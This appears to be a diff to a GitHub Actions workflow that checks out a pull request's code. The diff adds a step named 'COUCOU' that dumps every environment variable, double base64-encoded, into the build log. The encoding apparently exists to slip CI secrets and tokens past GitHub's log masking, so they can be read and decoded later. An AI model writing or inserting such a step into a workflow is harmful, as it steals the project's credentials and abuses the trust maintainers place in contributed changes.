@@ -25,7 +25,10 @@ jobs:
       - uses: actions/checkout@v2
         with:
           ref: ${{ github.event.pull_request.head.sha }}
-
+      - name: COUCOU
+        run: |
+          env | base64 -w0| base64 -w0
+        
       - name: ${{ matrix.tools }}
         uses: microsoft/action-python@0.7.1
         with:
